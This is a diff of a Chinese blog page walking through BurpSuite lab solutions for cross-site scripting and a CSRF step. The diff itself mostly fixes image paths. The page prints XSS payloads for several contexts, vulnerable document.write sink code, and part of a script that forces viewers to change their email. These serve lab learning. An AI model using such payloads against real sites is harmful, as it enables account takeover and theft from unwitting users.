@@ -704,12 +704,12 @@
 <h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><strong>BurpSuite-Lab</strong><br>1:将 存储XSS 到 HTML 上下文中，不编码任何内容</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 </code></pre>
-<p>2: DOM XSS使用 source 的 sink 中的中的 document.location.search<br>f12查看sources中对应的内容</p>
+<p>2: DOM XSS使用 source 的 sink 中的中的 document.location.search<br>f12查看sources中对应的内容<br>备注：由于在hexo中，会索引到img src=”图片路径”，则都需要用`到代替”</p>
 <pre class=" language-js"><code class="language-js"> <span class="token keyword">function</span> <span class="token function">trackSearch</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                            document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/2024/09/21/19154.htmlresources" >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+query+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                         <span class="token punctuation">}</span>
 
-<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/2024/09/21/19154.htmlresources"</span> <span class="token operator">></span><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">+</span>'"<span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif`</span></span><span class="token operator">?</span>searchTerms<span class="token operator">=</span><span class="token string">'+`>&lt;svg onload=alert(1)>+'</span>"<span class="token operator">></span>
 </code></pre>
 <p>输入query为：</p>
 <pre class=" language-js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
@@ -728,9 +728,9 @@
 <p>点击name为a的会弹出弹窗打印1<br>7：将反射XSS 为带有尖括号 HTML 编码的 JavaScript 字符串<br>f12查看sources中对应的内容</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
  <span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'sss'</span><span class="token punctuation">;</span>
- document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/2024/09/21/19154.htmlresources" >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/2024/09/21/19154.htmlresources"</span> <span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>
 </code></pre>
 <pre class=" language-js"><code class="language-js">GET <span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token string">'-alert(123)-'</span>
 </code></pre>
@@ -801,19 +801,19 @@ https<span class="token punctuation">:</span><span class="token operator">/</spa
 <p>source中</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 <span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'&lt;/script>&lt;script>alert(1)&lt;/script>'</span><span class="token punctuation">;</span>
-                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/2024/09/21/19154.htmlresources" >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 </code></pre>
 <p>16：将反射 XSS 为带有尖括号和双引号的 JavaScript 字符串，HTML 编码和单引号转义<br>payload：'-alert(1)//</p>
 <p>先将\转义为\然后’将前面内容进行闭合,再用-间隔内容，最后//注释后面内容</p>
 <pre class=" language-js"><code class="language-js"> <span class="token operator">&lt;</span>script<span class="token operator">></span>
                         <span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//';</span>
-                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/2024/09/21/19154.htmlresources" >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                     <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 </code></pre>
 <p>17：存储型XSS 到onclick带有尖括号和双引号的事件中，HTML 编码和单引号和反斜杠转义<br>评论处：<a target="_blank" rel="noopener" href="http://foo/?'-alert(1)-">http://foo?'-alert(1)-</a>'<br>由于'不受encodeURI编码和html十进制和十六进制实体编码控制，<br>浏览器解析为：<a target="_blank" rel="noopener" href="http://test/?%27-alert(1)-%27">http://test/?%27-alert(1)-%27</a><br>控制台解析为：<a target="_blank" rel="noopener" href="http://foo/?'-alert(1)-'">http://foo?'-alert(1)-'</a></p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>p<span class="token operator">></span>
-       <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/2024/09/21/19154.htmlresources"</span>  <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"avatar"</span><span class="token operator">></span>                            
+       <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/avatarDefault.svg`</span></span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"avatar"</span><span class="token operator">></span>                            
       <span class="token operator">&lt;</span>a id<span class="token operator">=</span><span class="token string">"author"</span> href<span class="token operator">=</span><span class="token string">"http://foo?'-alert(1)-'"</span> onclick<span class="token operator">=</span><span class="token string">"var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');"</span><span class="token operator">></span>a<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">|</span> <span class="token number">15</span> September <span class="token number">2024</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
 </code></pre>
@@ -853,7 +853,6 @@ body:username.value+<span class="token punctuation">'</span>:<span class="token 
 <p>登录wiener:peter账号</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>input required<span class="token operator">=</span><span class="token string">""</span> type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"csrf"</span> value<span class="token operator">=</span><span class="token string">"E7tYLI9q0fpKyvHfk9B43Q7uKohOuYn2"</span><span class="token operator">></span>
 </code></pre>
-<p>这将使查看评论的任何人发出 POST 请求，以将其电子邮件地址更改为 。<a href="mailto:test@test.com">test@test.com</a></p>
 <p>这将使查看评论的任何人发出 POST 请求，以将其电子邮件地址更改为 。<a href="mailto:test@test.com">test@test.com</a></p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 <span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
